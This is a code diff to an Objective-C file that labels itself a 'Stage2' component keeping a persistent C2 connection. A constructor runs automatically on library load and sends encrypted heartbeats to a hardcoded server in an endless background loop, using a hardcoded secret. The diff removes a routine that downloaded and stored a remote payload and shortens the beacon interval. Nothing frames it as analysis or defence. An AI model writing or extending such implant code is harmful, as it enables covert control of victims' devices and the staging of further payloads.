@@ -4,15 +4,13 @@
 #import <CommonCrypto/CommonDigest.h>
 
 /* ============================================================
- * Minimal Stage2 (link-only): fixed base URL, no domain pool.
+ * Minimal Stage2 (heartbeat only): fixed base URL
  * Phase 1: keep a persistent C2 connection
- *   - GET /details/show.html (store raw payload)
  *   - POST /event heartbeat (AES-256-ECB, key=SHA256(secret+ts))
  *   - loop forever
  * ============================================================ */
 
 static NSString *const kBaseURL = @"http://192.168.36.253:18889";
-static NSString *const kShowHTMLPath = @"/details/show.html";
 static NSString *const kEventPath = @"/event";
 static NSString *const kHeartbeatSecret = @"Ek8pl31K2yeHgQwy";
 static NSString *const kUserAgent =
@@ -98,59 +96,54 @@ static NSData *PLAes256EcbEncrypt(NSData *plain, NSData *key) {
     return out;
 }
 
-/* ---------------- link engine ---------------- */
+/* ---------------- heartbeat engine ---------------- */
 
 static NSString *SaveDir(void) {
     NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
     return paths.firstObject ?: @"/tmp";
 }
 
-static BOOL PLFetchShowHTML(void) {
-    NSString *url = [kBaseURL stringByAppendingString:kShowHTMLPath];
-    NSInteger status = 0;
-    NSData *raw = PLHTTPRequest(url, @"GET", nil, &status);
-    if (!raw || status != 200 || raw.length == 0) {
-        NSLog(@"[stage2] show.html fetch failed: status=%ld len=%zu",
-              (long)status, raw.length);
-        return NO;
-    }
-    NSString *fn = [SaveDir() stringByAppendingPathComponent:@"stage2_show_raw.bin"];
-    [raw writeToFile:fn atomically:YES];
-    NSLog(@"[stage2] show.html fetched: %zu bytes -> %@", raw.length, fn);
-    return YES;
-}
-
 static BOOL PLSendHeartbeat(void) {
     NSDate *now = [NSDate date];
     NSString *ts = [NSString stringWithFormat:@"%.0f", now.timeIntervalSince1970 * 1000.0];
-    NSDictionary *payload = @{
-        @"ts": ts,
-        @"t": @"hb",
-    };
-    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
-    NSString *plainString = [ts stringByAppendingString:
-        [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
+    
+    // 简单的心跳数据包
+    NSString *plainString = [NSString stringWithFormat:@"heartbeat:%@", ts];
     NSData *plain = [plainString dataUsingEncoding:NSUTF8StringEncoding];
 
+    // 生成加密密钥
     NSString *keyInput = [kHeartbeatSecret stringByAppendingString:ts];
     NSData *key = PLSHA256([keyInput dataUsingEncoding:NSUTF8StringEncoding]);
+    
+    // 加密心跳数据
     NSData *cipher = PLAes256EcbEncrypt(plain, key);
-    if (!cipher) return NO;
+    if (!cipher) {
+        NSLog(@"[stage2] heartbeat encryption failed");
+        return NO;
+    }
 
+    // 发送心跳包
     NSString *url = [kBaseURL stringByAppendingString:kEventPath];
     NSInteger status = 0;
     NSData *resp = PLHTTPRequest(url, @"POST", cipher, &status);
 
-    NSString *base = [NSString stringWithFormat:@"stage2_event_%.0f",
-        now.timeIntervalSince1970];
-    [plain writeToFile:[SaveDir() stringByAppendingPathComponent:[base stringByAppendingString:@".plain"]]
-             atomically:YES];
-    if (resp) {
-        [resp writeToFile:[SaveDir() stringByAppendingPathComponent:[base stringByAppendingString:@".resp"]]
-                atomically:YES];
+    // 记录日志
+    NSLog(@"[stage2] heartbeat sent: ts=%@ status=%ld cipher_len=%zu", 
+          ts, (long)status, cipher.length);
+    
+    // 保存发送记录用于调试
+    NSString *logFile = [SaveDir() stringByAppendingPathComponent:@"heartbeat_log.txt"];
+    NSString *logEntry = [NSString stringWithFormat:@"%@ - ts=%@ status=%ld\n", 
+                         [NSDate date], ts, (long)status];
+    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logFile];
+    if (!fh) {
+        [logEntry writeToFile:logFile atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    } else {
+        [fh seekToEndOfFile];
+        [fh writeData:[logEntry dataUsingEncoding:NSUTF8StringEncoding]];
+        [fh closeFile];
     }
-    NSLog(@"[stage2] heartbeat: plain=%zu cipher=%zu status=%ld",
-          plain.length, cipher.length, (long)status);
+    
     return resp != nil;
 }
 
@@ -159,13 +152,14 @@ static BOOL PLSendHeartbeat(void) {
 __attribute__((constructor))
 static void Stage2Entry(void) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
-        if (!PLFetchShowHTML()) {
-            for (int i = 0; i < 5 && !PLFetchShowHTML(); i++)
-                [NSThread sleepForTimeInterval:10.0];
-        }
+        NSLog(@"[stage2] heartbeat-only mode started");
+        
+        // 循环发送心跳包
         for (;;) {
-            PLSendHeartbeat();
-            [NSThread sleepForTimeInterval:600.0];
+            @autoreleasepool {
+                PLSendHeartbeat();
+                [NSThread sleepForTimeInterval:60.0]; // 每1分钟发送一次
+            }
         }
     });
 }
